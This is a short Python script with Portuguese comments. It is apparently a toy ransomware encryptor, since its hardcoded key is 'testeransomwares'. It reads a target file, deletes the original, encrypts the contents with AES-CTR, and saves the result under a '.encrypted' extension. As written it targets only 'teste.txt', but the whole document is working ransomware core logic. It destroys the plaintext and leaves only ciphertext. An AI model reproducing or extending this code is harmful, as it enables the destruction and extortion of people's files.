import os
import pyaes

def encrypt_file(file_path, key):
    # Abrir o arquivo a ser criptografado
    with open(file_path, "rb") as file:
        file_data = file.read()

    # Remover o arquivo original
    os.remove(file_path)

    # Criptografar usando AES-CTR
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    encrypted_file_path = file_path + ".encrypted"
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(crypto_data)

    return encrypted_file_path

# Arquivo que queremos criptografar
file_to_encrypt = "teste.txt"

# Chave de criptografia
key = b"testeransomwares"

# Criptografar o arquivo
encrypted_file_path = encrypt_file(file_to_encrypt, key)

# Exibir mensagem ao usuário
print("Arquivo criptografado com sucesso:", encrypted_file_path)
